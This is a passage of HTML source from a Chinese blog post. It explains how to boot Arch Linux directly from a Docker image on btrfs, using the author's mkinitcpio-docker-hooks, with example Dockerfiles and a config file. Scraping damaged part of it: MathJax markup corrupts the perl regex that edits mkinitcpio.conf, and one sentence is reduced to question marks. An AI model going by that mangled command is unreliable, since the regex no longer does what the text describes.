class=\"crayon-v\">software</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">properties</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">common </span><span class=\"crayon-e\">python</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb33c7393815678-4\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">add</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">repository </span><span class=\"crayon-v\">ppa</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">chris</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">lea</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">node</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">js</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33c7393815678-5\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"deb http://us.archive.ubuntu.com/ubuntu/ precise universe\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sources</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">list</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb33c7393815678-6\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">update</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33c7393815678-7\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nodejs</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb33c7393815678-8\"><span class=\"crayon-p\">#RUN apt-get install -y nodejs=0.6.12~dfsg1-1ubuntu1</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33c7393815678-9\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">mkdir</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">www</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb33c7393815678-10\"><span class=\"crayon-e\">ADD </span><span class=\"crayon-v\">app</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">js</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">www</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">app</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">js</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33c7393815678-11\"><span class=\"crayon-i\">CMD</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">\"/usr/bin/node\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"/var/www/app.js\"</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0033 seconds] -->\r\n<p>有了Dockerfile，只需要<code>docker build</code>一条命令就可以创建一个docker镜像。同时Docker公司提供一个叫做DockerHub的服务，可以免费托管公开镜像。只需要使用<code>docker push</code>就可以直接把镜像上传到DockerHub。在不同的电脑上只需要<code>docker pull</code>就可以从DockerHub获取最新版的镜像。DockerHub还支持自动构建，通过把DockerHub帐号跟GitHub帐号关联起来，就可以让DockerHub在GitHub上面的Dockerfile出现更改的时候自动重新生成镜像。</p>\n<p>本文开头所说的这种一致性的维护，docker实际上已经在给我们提供答案了：我们通过构建一个docker镜像，让这个镜像包含着我们项目所需要的所有的一切。这样的话，我们开发，测试，部署等等一切任务，都可以在先用<code>docker run</code>来开启一个容器，然后在容里面进行所有的工作。当我们决定修改运行环境，比如引入新的库的时候，就在Dockerfile中进行相应的修改，重新生成镜像，然后在不同的机器上用<code>docker pull</code>来更新一下就好。这种使用哲学，通过一个中心化了的仓库，非常优雅地解决了不同机器上环境一致的问题。美中不足的是，并不是所有的程序都能在容器里运行的，也并不是所有的程序都方便在容器里运行的。如果你用到了图形界面的程序，或者说是一些系统级别的程序，那么在容器里面使用这些程序会麻烦很多，有的甚至根本无法实现。于是自然地就会想到，如果我们能够在每次开机的时候，直接把某个docker生成的镜像挂载起来当根目录来使用，就可以让这个镜像直接在裸机上（而不是在容器中）运行，来做我们的日常桌面系统了。</p>\n<p>这种做法，除了在保持一致性方面带来的便利以外，还有一些其他的好处：</p>\n<ul>\n<li>整个系统保存在云端，本地的内容仅仅是云端的一份缓存而已，这样就完全没有必要定期对系统进行备份了。</li>\n<li>你的系统是如何从零开始一步一步配置成你想要的样子的，所有的一切都清晰地展现在Dockerfile里面。Dockerfile就是你最好的笔记。</li>\n<li>完全不用担心系统长时间使用产生一些残余的垃圾文件、或者某些系统中某些程序的数据出现损坏，因为每次开机，我们用的都是一个全新的系统。</li>\n<li>要装一台新机器，并不需要从头安装操作系统，只要从DockerHub拉取镜像拿来用就好，安装系统这个过程变得极其方便。</li>\n<li>系统更新的过程实际上就是根据Dockerfile从最新的软件仓库重新从头安装生成docker镜像的过程，不会出现某些更新遇到文件冲突或者依赖无法处理，需要人为干预才能完成的问题。</li>\n</ul>\n<h1 id=\"docker存储驱动的工作原理\">docker存储驱动的工作原理</h1>\n<p>Docker的存储驱动<a href=\"https://docs.docker.com/engine/userguide/storagedriver/imagesandcontainers/\" target=\"_blank\" rel=\"noopener\">官方有介绍其工作原理</a>，这里只是简单概括一下。Docker使用了层的概念，docker在构建镜像的时候，会逐行执行我们的Dockerfile中的每一行，每执行一行的时候，docker就会创建出一个新的层来存放新的内容。当我们执行<code>docker pull</code>或者<code>docker push</code>的时候，docker实际上传跟下载的是这些层之间的增量。每当执行<code>docker run</code>，docker就会把这些下载下来的层组合到一起，组合成一个完整的镜像，然后新建一个读写层，所有运行过程中的写入都会被写入到读写层中，而镜像本身则是保持只读，不会被更改。“层”这个概念具体实现起来，根据docker目录（通常为<code>/var/lib/docker</code>这个目录）所在的文件系统的不同而不同，具体的实现在docker中被称为graph driver，docker自带的graph driver包括aufs、 overlay、btrfs、zfs、devicemapper等。这些graph driver大多使用了写时复制的技术，这样在把各个层组合在一起的过程不需要重新拷贝一份数据，实际的拷贝是在写入的时候发生的。</p>\n<p>由于笔者使用的是btrfs，所以本文就以btrfs为例子来介绍怎么让系统启动到docker镜像上去。btrfs是一个写时复制的系统，由于docker的镜像是由一个一个的层叠在一起组成的，docker在使用btrfs的时候，每往上叠一层，docker就会创建一个原来层的快照，然后把新层的内容写到快照里面去。然后docker会在从镜像创建容器的时候，给镜像的最顶层做个快照，把这个快照当作容器读写层来用。</p>\n<h1 id=\"启动到docker镜像中去\">启动到docker镜像中去</h1>\n<p>明白了docker存储驱动的工作原理，还需要知道Linux的启动过程才能达成我们的目标。Linux在启动的时候，一般会让启动器给内核装载一个内存盘initramfs，然后内核完成简单的早期初始化以后，就会解压内存盘的内容到根目录<code>/</code>，然后启动内存盘中的init程序（一般为<code>/init</code>），这个init程序会进行进一步的初始化（比如说加载文件系统的驱动，对文件系统进行fsck等），这一步初始化完成了以后，这个init程序就会根据内核选项中的<code>root</code>、<code>rootflags</code>等内容挂载真正的根目录，然后通过<code>switch_root</code>程序启动真正根目录中的init程序，这个init程序则会完成最后的初始化工作，比如挂载fstab、加载图形界面等等。很多发行版都提供制作initramfs的工具，比如archlinux的mkinitcpio，这些工具通常都是模块化的，允许用户自己添加hook。</p>\n<p>让系统启动到docker镜像所需要的知识已经完备了。思路也清晰了：通过给initramfs中添加hook，让initramfs中的init在挂载root之前从docker本地缓存中的镜像中创建出一个快照作为读写层，然后把这个读写层当作真正的root来挂载。具体操作上，在启动管理器里面写启动项的内核选项的时候，<code>root</code>就写<code>/var/lib/docker</code>所在的分区，而<code>rootflags</code>里面至少要有一项<code>subvol=XXXXX</code>，其中XXXXX是我们打算创建的读写层的位置。然后重中之重则是，写一个hook，这个hook干的事情是：找到想要的docker镜像对应的btrfs子卷，给这个子卷创建一个快照，命名为XXXXX（跟内核选项中的名字保持一致）。这样的话，在Linux把控制权交给initramfs中的init程序以后，init程序会先去从docker缓存中的子卷创造出XXXXX快照，然后把XXXXX快照当作root来挂载以及进行接下来的操作。如果读者跟笔者一样使用Arch Linux的话，那么所有的这些工作笔者已经做了，读者可以直接拿来用。</p>\n<p>笔者的源码位于GitHub： <a href=\"https://github.com/zasdfgbnm/mkinitcpio-docker-hooks\" target=\"_blank\" rel=\"noopener\">https://github.com/zasdfgbnm/mkinitcpio-docker-hooks</a> ，同时读者也可以直接从AUR中搜索<code>mkinitcpio-docker-hooks</code>来安装笔者的hook。下面就来介绍一下这个hook的使用方法。</p>\n<h1 id=\"mkinitcpio-docker-hooks的使用\">mkinitcpio-docker-hooks的使用</h1>\n<p>mkinitcpio-docker-hooks的使用流程大概分为如下几步：</p>\n<ol>\n<li>确保你的<code>/var/lib/docker</code>位于某个btrfs分区中</li>\n<li>准备一个适合在裸机上启动的docker镜像</li>\n<li>然后在这个镜像中安装并配置mkinitcpio-docker-hooks</li>\n<li>准备内核跟initramfs</li>\n<li>准备top layer的内容</li>\n<li>设置启动管理器</li>\n</ol>\n<h2 id=\"docker镜像的准备\">docker镜像的准备</h2>\n<p>要想启动到docker镜像中去，首先你得有一个适合在裸机上启动的docker镜像。很多docker镜像，为了减小镜像的大小，是不会附带只有裸机上才能用到的软件包（比如<code>dhcpcd</code>）的，所以读者可能需要在Dockerfile中手动安装这些软件包，对于Arch Linux来讲，只需要安装base组就可以了。由于接下来要安装<code>mkinitcpio-docker-hooks</code>，这里推荐使用一个已经内置yaourt的镜像，笔者使用的是自己的archlinux-yaourt镜像<a href=\"https://cloud.docker.com/swarm/zasdfgbnm/repository/docker/zasdfgbnm/archlinux-yaourt/general\" target=\"_blank\" rel=\"noopener\">zasdfgbnm/archlinux-yaourt</a>。所以，Dockerfile的开头看起来是这个样子的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2a1eb33d6346528223\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nFROM zasdfgbnm/archlinux-yaourt\r\nUSER root\r\nRUN pacman -Syu --noconfirm base</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33d6346528223-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb33d6346528223-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33d6346528223-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33d6346528223-1\"><span class=\"crayon-e\">FROM </span><span class=\"crayon-v\">zasdfgbnm</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">archlinux</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">yaourt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb33d6346528223-2\"><span class=\"crayon-e\">USER </span><span class=\"crayon-e\">root</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33d6346528223-3\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">pacman</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Syu</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">noconfirm </span><span class=\"crayon-v\">base</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>作为示例，这里就不安装base之外的其他软件了，读者请自己根据需要安装其他软件。</p>\n<h2 id=\"安装并配置mkinitcpio-docker-hooks\">安装并配置mkinitcpio-docker-hooks</h2>\n<p><code>mkinitcpio-docker-hooks</code>的安装是在docker里面而不是当前运行在裸机上的系统中进行的。之所以要把这个软件包安装在docker镜像里面，很重要的原因是因为Linux内核不提供ABI的稳定性，所以内核模块跟内核的版本必须严格对应，不然模块是无法加载的。为了保持这种一致性，我们采取的措施是，在docker里面安装<code>mkinitcpio-docker-hooks</code>，在docker中生成initramfs，并且在启动的时候用镜像里面的内核启动，就可以确保内核、initramfs中的模块、启动到镜像以后的<code>/lib/modules</code>三者保持一致。安装过程在Dockerfile中的写法如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2a1eb33de849326811\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nRUN sudo -u user yaourt -S --noconfirm mkinitcpio-docker-hooks</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33de849326811-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33de849326811-1\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">sudo</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">user </span><span class=\"crayon-v\">yaourt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">noconfirm </span><span class=\"crayon-v\">mkinitcpio</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">hooks</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>安装完了<code>mkinitcpio-docker-hooks</code>以后还需要配置，配置文件在<code>/etc/docker-btrfs.json</code>，初始内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2a1eb33e4408932647\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n{\r\n    \"docker_image\": \"archlinux/base\",\r\n    \"docker_tag\": \"latest\"\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33e4408932647-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb33e4408932647-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33e4408932647-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb33e4408932647-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33e4408932647-1\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb33e4408932647-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"docker_image\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"archlinux/base\"</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33e4408932647-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">\"docker_tag\"</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"latest\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb33e4408932647-4\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>我们需要做的就是把这两个变量的值替换为我们想要的值，比如说这里我打算把我的docker镜像的名字叫做“sample_image”。同时，我们还需要在<code>/etc/mkinitcpio.conf</code>中添加<code>docker-btrfs</code>这个hook。<br>\n综上，可以在Dockerfile中使用如下命令来配置：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2a1eb33ea824176282\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nRUN sed -i 's/archlinux\\/base/sample_image/g' /etc/docker-btrfs.json\r\nRUN perl -i -p -e 's/(?&lt;=^HOOKS=<span class=\"MathJax_Preview\">\\()(.*)(?=\\)</span>)/$1 docker-btrfs/g' /etc/mkinitcpio.conf</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33ea824176282-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb33ea824176282-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33ea824176282-1\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">sed</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/archlinux\\/base/sample_image/g'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">docker</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">btrfs</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">json</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb33ea824176282-2\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">perl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">e</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/(?&lt;=^HOOKS=<span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span>(.*)(?=<span class=\"MathJax_Preview\">\\()/$1 docker-btrfs/g'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mkinitcpio</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">conf</span></span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0027 seconds] -->\r\n<p>??????????????Dockerfile??</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2a1eb33ef426850647\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"?????\"></span><div class=\"crayon-button crayon-nums-button\" title=\"?????????\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"???????\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"??????\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"??????\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"????\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"?????????\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nFROM zasdfgbnm/archlinux-yaourt\r\nUSER root\r\nRUN pacman -Syu --noconfirm base\r\nRUN sudo -u user yaourt -S --noconfirm mkinitcpio-docker-hooks\r\nRUN sed -i 's/archlinux\\/base/sample_image/g' /etc/docker-btrfs.json\r\nRUN perl -i -p -e 's/(?&lt;=^HOOKS=\\))(.*)(?=<span class=\"MathJax_Preview\">\\()/$1 docker-btrfs/g' /etc/mkinitcpio.conf</span></textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr 